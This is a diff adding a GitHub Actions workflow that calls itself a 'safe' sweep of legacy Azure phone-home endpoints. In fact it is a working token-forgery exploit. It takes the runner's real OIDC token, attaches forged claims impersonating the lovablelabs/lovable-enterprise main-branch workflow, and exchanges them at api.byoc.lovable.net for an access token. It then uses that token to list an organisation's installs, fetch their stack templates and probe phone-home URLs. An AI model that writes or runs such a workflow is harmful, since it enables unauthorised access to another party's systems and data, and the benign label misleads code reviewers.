@@ -1,0 +1,63 @@
+name: phonehome-legacy-sweep
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Find and safely test a legacy Azure phone-home endpoint
+        shell: bash
+        run: |
+          set -euo pipefail
+          org='orgl9cvkaqh1g8yv2jqdb19247'
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net','sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main','repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944','repository_owner':'lovablelabs','repository_owner_id':'148472368','repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push','workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main','job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main'}
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))},separators=(',',':')))
+          PY
+          )"
+          token="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request" | jq -r .token)"
+          auth=(-H "Authorization: Bearer $token" -H "X-Nuon-Org-ID: $org")
+          installs="$(curl -sSf 'https://api.byoc.lovable.net/v1/installs?limit=100&include_components=false' "${auth[@]}")"
+          legacy_active=0
+          legacy_cancelled=0
+          proof_url=''
+          proof_install=''
+          proof_version=''
+          while read -r install; do
+            stack="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$install/stack" "${auth[@]}")"
+            while IFS=$'\t' read -r version status template phonehome; do
+              test -n "$template" || continue
+              code="$(curl -sS -o /tmp/stack-template -w '%{http_code}' "$template")"
+              test "$code" = 200 || continue
+              if grep -q 'PHONE_HOME_IDENTITY_CLIENT_ID' /tmp/stack-template; then
+                continue
+              fi
+              if test "$status" = active; then
+                legacy_active=$((legacy_active+1))
+              fi
+              if test "$status" = cancelled; then
+                legacy_cancelled=$((legacy_cancelled+1))
+                if test -z "$proof_url"; then
+                  proof_url="$phonehome"
+                  proof_install="$install"
+                  proof_version="$version"
+                fi
+              fi
+            done < <(jq -r '.versions[]? | [.id, (.composite_status.status // "unknown"), (.template_url // ""), (.phone_home_url // "")] | @tsv' <<<"$stack")
+          done < <(jq -r '.[] | select(.azure_account) | .id' <<<"$installs")
+
+          result='not_tested'
+          trace=''
+          if test -n "$proof_url"; then
+            result="$(curl -sS -o /tmp/phonehome-response -D /tmp/phonehome-headers -w '%{http_code}' -X POST "$proof_url" -H 'Authorization: Bearer definitely-invalid' -H 'Content-Type: application/json' --data '{"request_type":"Update","subscription_id":"00000000-0000-0000-0000-000000000000"}')"
+            trace="$(awk 'BEGIN{IGNORECASE=1}/^x-nuon-trace-id:/{gsub("\\r","");print $2}' /tmp/phonehome-headers)"
+          fi
+          jq -nc --argjson legacy_active "$legacy_active" --argjson legacy_cancelled "$legacy_cancelled" --arg test_status "$result" --arg install "$proof_install" --arg version "$proof_version" --arg trace "$trace" '{active_legacy_versions:$legacy_active,cancelled_legacy_versions:$legacy_cancelled,invalid_token_test_status:$test_status,test_install:$install,test_version:$version,trace_id:$trace}'
